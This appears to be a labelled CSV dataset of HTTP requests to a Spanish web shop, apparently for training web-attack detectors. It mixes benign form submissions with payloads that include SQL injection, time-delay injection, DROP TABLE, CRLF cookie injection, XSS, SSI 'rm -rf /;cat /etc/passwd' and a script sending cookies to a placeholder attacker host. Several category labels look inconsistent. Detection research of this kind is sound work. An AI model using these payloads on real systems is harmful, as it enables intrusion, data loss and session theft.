payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
1%20 HTTP/1.1,encoded attack,no,13,0,0,0,0,high
any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,60,0,0,0,0,medium
insertar | 306 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 306 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | couse | remanoso | Viviana | Guimera Faraco"" AND ""1""=""1 | andre@alfombra.com.me | 13758311X | Calle La Fuente, 59, 13?B | Algadefe | 46910 | Burgos | 5183768775927993 | Registrar HTTP/1.1",cmd,no,198,1,0,0,1,low
"registro | couse | remanoso | Viviana | He,usser | andre@alfombra.com.me | 13758311X | Calle La Fuente, 59, 13?B | Algadefe | 46910 | Burgos | 5183768775927993 | Registrar HTTP/1.1",cmd,no,180,0,0,0,1,low
"registro | couse | remanoso | Viviana | Guimera Faraco | andre@alfombra.com.me | 13758311X | Calle La Fuente, 59, 13?B | Algadefe | 46910 | Burgos | 5183768775927993 | Registrar HTTP/1.1",cmd,no,186,0,0,0,1,low
Vaciar carritoparos%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,encoded attack,no,84,1,0,0,0,low
"entrar | jeanes | ,'caire | on | Entrar HTTP/1.1",cmd,no,48,1,0,0,1,medium
%00 HTTP/1.1,encoded attack,no,12,0,0,0,0,high
insertar+ | 514 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 514 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,60,0,0,0,0,medium
entrar | villella | 5e04ayo | on/ | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | villella | 5e04ayo | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
"1','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,50,1,0,0,1,medium
insertar | 40 | Pasar por caja/ HTTP/1.1,cmd,no,40,0,0,0,1,medium
insertar | 40 | Confirmar HTTP/1.1,cmd,no,34,0,0,0,1,medium
"registro | pravato | rastrero | Robustiana | Laspiur' AND '1'='1 | kurz@kayaalicante.cn | 60962318J | C/ Santa Anna, S/N  | Villaespasa | 26292 | Navarra | 8682803216185712 | Registrar HTTP/1.1",cmd,no,193,1,0,0,1,low
"registro | pravato | rastrero | Robustiana | Laspiur | kurz@kayaalicante.cn | 60962318J | C/ Santa Anna, S/N  | Villaespasa | 26292 | Navarra | | | Registrar HTTP/1.1",cmd,no,166,0,0,0,1,low
"registro | pravato | rastrero | Robustiana | Laspiur | kurz@kayaalicante.cn | 52'63986G | C/ Santa Anna, S/N  | Villaespasa | 26292 | Navarra | 8682803216185712 | Registrar HTTP/1.1",cmd,no,181,1,0,0,1,low
"registro | pravato | rastrero | Robustiana | Laspiur | kurz@kayaalicante.cn | 60962318J | C/ Santa Anna, S/N  | Villaespasa | 26292 | Navarra | 8682803216185712 | Registrar HTTP/1.1",cmd,no,181,0,0,0,1,low
"Vaciar carrito<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,67,1,1,0,1,medium
registro | kh'ez?ri | 2ic15 | Amando | Mompart Anglaril | parente@espaciopintor.ro | 65049815L | Plza. Pablo Picasso 198 4-C | Villamoronta | 03517 | Teruel | 8000827068875110 | Registrar HTTP/1.1,cmd,no,196,1,0,0,1,low
registro | pojanart | 2ic15 | Amando | Mompart Anglaril | parente@espaciopintor.ro | 65049815L | Plza. Pablo Picasso 198 4-C | Villamoronta | 03517 | Teruel | 8000827068875110 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low
entrar | */vander'we | pazguat5 | off | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium
entrar | johanne | pazguat5 | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
1any%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,58,0,0,0,0,medium
bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,xss,no,57,0,1,0,0,medium
insertar | 4689 | Confirmar'OR'a='a HTTP/1.1,cmd,no,44,1,0,0,1,medium
"insertar | "" AND ""1""=""1 | Confirmar HTTP/1.1",cmd,no,44,1,0,0,1,medium
insertar | 4689 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4689 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | craig-du | 8rre0dad7ra | Octavia | Yaben Billini | formichi@nevadahispanica.pt | 09082221G | Avinguda Gatassa S/N 5Aany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Olmedillo de Roa | 39255 | Ourense | 9946991800186707 | Registrar HTTP/1.1,cmd,no,264,0,0,0,1,low
registro | craig-du | 8rre0dad7ra | Octavia | Yaben Billini | jade@antiviru@sgra@tuitos.gs | 09082221G | Avinguda Gatassa S/N 5A | Olmedillo de Roa | 39255 | Ourense | 9946991800186707 | Registrar HTTP/1.1,cmd,no,205,0,0,0,1,low
registro | craig-du | 8rre0dad7ra | Octavia | Yaben Billini | formichi@nevadahispanica.pt | 09082221G | Avinguda Gatassa S/N 5A | Olmedillo de Roa | 39255 | Ourense | 9946991800186707 | Registrar HTTP/1.1,cmd,no,204,0,0,0,1,low
Vaciar carrito' DELETE FROM USERS HTTP/1.1,other,no,42,1,0,0,0,medium
entrar | beehler | PenEtRAL | off/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,37,1,0,0,1,medium
insertar | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Confirmar HTTP/1.1,cmd,no,86,0,0,0,1,low
insertar | 5165 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5165 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
' AND '1'='1 HTTP/1.1,other,no,21,1,0,0,0,high
entrar | barrio | ja3886l7 | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | barrio | ja3886l7 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1'INJECTED_PARAM HTTP/1.1,other,no,25,1,0,0,0,high
Credenciales incorrectas'INJECTED_PARAM HTTP/1.1,other,no,48,1,0,0,0,medium
"','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,45,1,0,0,1,medium
"insertar | 6791 | "" AND ""1""=""1 HTTP/1.1",cmd,no,39,1,0,0,1,medium
insertar | 6791 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6791 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carrito+ HTTP/1.1,other,no,24,0,0,0,0,high
"registro | nyberg | predicha | Carmina | Serarols Ginesta<!--#include file=""archivo_secreto"" --> | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | Registrar HTTP/1.1",sql,no,228,1,1,0,1,low
"registro | nyberg | predicha | Carmina | Serarols Ginesta | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | ';waitfor delay '0:0:15';-- HTTP/1.1",sql,no,207,1,0,0,1,low
"registro | nyberg | predicha | Carmina | Serarols Ginesta | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | Registrar HTTP/1.1",cmd,no,189,0,0,0,1,low
entrar | robles | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | off | Entrar HTTP/1.1,cmd,no,106,0,0,0,1,low
Credenciales incorrectas%3F HTTP/1.1,encoded attack,no,36,0,0,0,0,medium
insertar | 5877 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5877 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
Vaciar carrito'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,87,1,0,0,1,low
"<!--#include file=""archivo_secreto"" --> HTTP/1.1",sql,no,48,1,1,0,0,medium
"registro | hatchett | 13ua29i7lar | Adara Adela | Rossi Woolrich | luvv@ers@hiper@xxx.cx | 73280026W | Calle Bordadores, 100, 6?C | Sobremunt | 44411 | Asturias | 1840594959799208 | Registrar HTTP/1.1",cmd,no,200,0,0,0,1,low
"registro | hatchett | 13ua29i7lar | Adara Adela | Rossi Woolrich | grimau@alquivira.tel | 73280026W | Calle Bordadores, 100, 6?C | Sobremunt | 44411 | Asturias | 1840594959799208 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
entrar | AND 1=1 | 5ra0sf873ismo | on | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
"entrar | de_crist | acontec'imie,nto | on | Entrar HTTP/1.1",cmd,no,59,1,0,0,1,medium
entrar | de_crist | 5ra0sf873ismo | on | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
1');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,38,1,0,0,1,medium
' DELETE FROM USERS HTTP/1.1,other,no,28,1,0,0,0,high
insertar | 7924 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7924 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | raymund | ,c'oraje | on | Entrar HTTP/1.1",cmd,no,50,1,0,0,1,medium
2%3F HTTP/1.1,encoded attack,no,13,0,0,0,0,high
"insertar | 1754"" AND ""1""=""1 | Confirmar HTTP/1.1",cmd,no,48,1,0,0,1,medium
insertar | 1754 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1754 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carrito%7C HTTP/1.1,encoded attack,no,26,0,0,0,0,high
@40 HTTP/1.1,other,no,12,0,0,0,0,high
"registro | sawyers | encUmb2ad3 | Max | Ve,rjaga Figarola | tamburi@hispadis.ar | 30293636Z | C/ Virgen De Las Angustias 122 4?A | Fuentespina | 48220 | Asturias | 8898020239162472 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
entrar | x?uan8 | pringoso | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | byran | pringoso | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1  HTTP/1.1,other,no,11,0,0,0,0,high
"Credenciales incorrectas','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,65,1,0,0,1,medium
');waitfor delay '0:0:15';-- | 4762 | Confirmar HTTP/1.1,sql,no,56,1,0,0,1,medium
insertar | 4762 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4762 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"Vaciar carrito','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,67,1,0,0,1,medium
registro | griggs3 | 49TO9El0 | Emanuel | Zinicola Cucurella | bergman@pintandomucho.la | 20437771V | Calle Fray Lu*is De Leon 119  | Calcena | 03580 | Lleida | 4946393543787658 | Registrar HTTP/1.1,cmd,no,198,0,0,0,1,low
registro | griggs3 | 49TO9El0 | Emanuel | Zinicola Cucurella | bergman@pintandomucho.la | 20437771V | Buen Lugar 69 6?F | Calcena | 03580 | Lleida | 4946393543787658 | Registrar HTTP/1.1,cmd,no,186,0,0,0,1,low
1any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,61,0,0,0,0,medium
| HTTP/1.1,cmd,no,10,0,0,0,1,high
insertar | 623@40 | Pasar por caja HTTP/1.1,cmd,no,43,0,0,0,1,medium
"insertar | <!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1",sql,no,60,1,1,0,1,medium
insertar | 623 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 623 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"Vaciar carrito""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,49,1,1,0,0,medium
"registro | jeanloui | remosquearse | Evelio | Fonfria Castillero | sprerris-apfel@tresbrujas.bn | 89061921X | C/ Cervantes 117, 10?G | Villafranca /del Campo | 50343 | Palencia | 9895940721818753 | Registrar HTTP/1.1",cmd,no,216,0,0,0,1,low
entrar | AND 1=1 | 815ja4 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
entrar | tammy5 | forzam'ie/n/to | on | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium
entrar | tammy5 | 815ja4 | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
1+ HTTP/1.1,other,no,11,0,0,0,0,high
Credenciales incorrectasany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,81,0,0,0,0,low
insertar | 37 | Confirmar/ HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 37 | Confirmar HTTP/1.1,cmd,no,34,0,0,0,1,medium
Vaciar carrito'OR'a='a HTTP/1.1,other,no,31,1,0,0,0,medium
"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,53,1,1,0,1,medium
entrar | fargo | engolfa | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Entrar HTTP/1.1,cmd,no,96,0,0,0,1,low
entrar | fargo | engolfa | off | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
"','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,41,1,0,0,1,medium
Credenciales incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,encoded attack,no,85,0,0,0,0,low
insertar | 7641 | ';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,54,1,0,0,1,medium
insertar | 7641 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7641 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrarparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | odele | 19ler8z6r | on | Entrar HTTP/1.1,cmd,no,131,0,0,0,1,low
entrar | cari?tta | 19ler8z6r | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | odele | 19ler8z6r | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
Credenciales incorrectassessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,encoded attack,no,379,0,0,0,0,low
%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 291 | Pasar por caja HTTP/1.1,cmd,no,84,0,0,0,1,low
insertar | 291 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 291 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | thac | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770+ | Toledo | 5546440906293369 | Registrar HTTP/1.1",cmd,no,188,0,0,0,1,low
"registro | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770 | Toledo | 5546440906293369 | Registrar HTTP/1.1",xss,no,231,0,1,0,1,low
"registro | thac | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770 | Toledo | 5546440906293369 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
"registro | beadley | colp-e | Clemencio | Marlasca | adrian@espanolynegocios.id | 07319581S | Barrio Rucandial 165,  | Pesaguero | 10320 | Sevilla | 1559596001370205 | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1",cmd,no,259,0,0,0,1,low
"registro | beadley | colp-e | Clemencio | Marlasca | adrian@espanolynegocios.id | 07319581S | Barrio Rucandial 165,  | Pesaguero | 10320 | Sevilla | 1559596001370205 | Registrar HTTP/1.1",cmd,no,186,0,0,0,1,low
"entrar | mast+en,br | 7T3c484 | on | Entrar HTTP/1.1",cmd,no,52,0,0,0,1,medium
entrar | parisen | 7T3c484 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,encoded attack,no,91,0,0,0,0,low
insertar | 3833 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
Vaciar carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,77,0,0,0,0,medium
1 | Queso Manchego | 39 | 8 | %00 HTTP/1.1,cmd,no,42,0,0,0,1,medium
"entrar | dadang','0','0');waitfor delay '0:0:15';-- | 6a1er87 | on | Entrar HTTP/1.1",sql,no,84,1,0,0,1,low
entrar | dadang | 6a1er87 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,143,1,1,0,0,low
"insertar | 6801 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,53,1,1,0,1,medium
insertar | 6801 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6801 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | Valldemosa, 129 4H | Frumales | 19490 | Valencia | 5024784015351535<SCRIPT>alert(""Paros"");</SCRIPT> | Registrar HTTP/1.1",xss,no,220,1,1,0,1,low
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | C/ Z*abal*+buru, 71,  | Frumales | 19490 | Valencia | 5024784015351535 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | Valldemosa, 129 4H | Frumales | 19490 | Valencia | 5024784015351535 | Registrar HTTP/1.1",cmd,no,188,0,0,0,1,low
"registro | thege | abstruso%00 | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Sant Feliu Sasserra | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
"registro | thege | abstruso | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Man+tin*os | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",cmd,no,182,0,0,0,1,low
"registro | thege | abstruso | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Sant Feliu Sasserra | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
entrar | +shinji | 4I8f0 | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | chiquia0 | 4I8f0 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 4639 | Confirmar%00 HTTP/1.1,cmd,no,39,0,0,0,1,medium
"insertar | 4639 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,71,1,0,0,1,medium
insertar | 4639 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4639 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | strauss | manirrota | Dania | Cucurull Forn'INJECTED_PARAM | everrett@fernandosoto.zr | 34016342D | Doctor Gomez Ulla, 7 13B | Boada de Campos | 45573 | Tarragona | 9293437709151698 | Registrar HTTP/1.1",cmd,no,213,1,0,0,1,low
"registro | strauss | manirrota | Dania | Cucurull Forn | everrett@fernandosoto.zr | 34016342D | Doctor Gomez Ulla, 7 13B | Boada de Campos | 45573 | Tarragona | 9293437709151698 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,73,1,0,0,1,medium
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A""><!--#EXEC cmd=""dir ""-->< | Borges del Camp, Les | 50343 | Baleares (Illes) | 1817134739036015 | Registrar HTTP/1.1",sql,no,229,1,1,0,1,low
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A | Borges del Camp, Les | 50343 | Salama/nca | 1817134739036015 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A | Borges del Camp, Les | 50343 | Baleares (Illes) | 1817134739036015 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
"3 | Vino Rioja | 39 | 69 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,72,1,0,0,1,medium
entrar | p+ap*e | 74oNc0 | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | ince | 74oNc0 | on | Entrar HTTP/1.1,cmd,no,45,0,0,0,1,medium
'INJECTED_PARAM HTTP/1.1,other,no,24,1,0,0,0,high
insertar | 3089 | | HTTP/1.1,cmd,no,28,0,0,0,1,high
insertar | 3089 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 3089 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | lutz | OpimA | off""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1",sql,no,71,1,1,0,1,medium
entrar | lutz | 'OR'a='a | off | Entrar HTTP/1.1,cmd,no,48,1,0,0,1,medium
entrar | lutz | OpimA | on/ | Entrar HTTP/1.1,cmd,no,45,0,0,0,1,medium
entrar | lutz | OpimA | off | Entrar HTTP/1.1,cmd,no,45,0,0,0,1,medium
"Credenciales incorrectas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,77,1,1,0,1,medium
"insertar""><!--#EXEC cmd=""dir ""-->< | 8962 | Confirmar HTTP/1.1",sql,no,62,1,1,0,1,medium
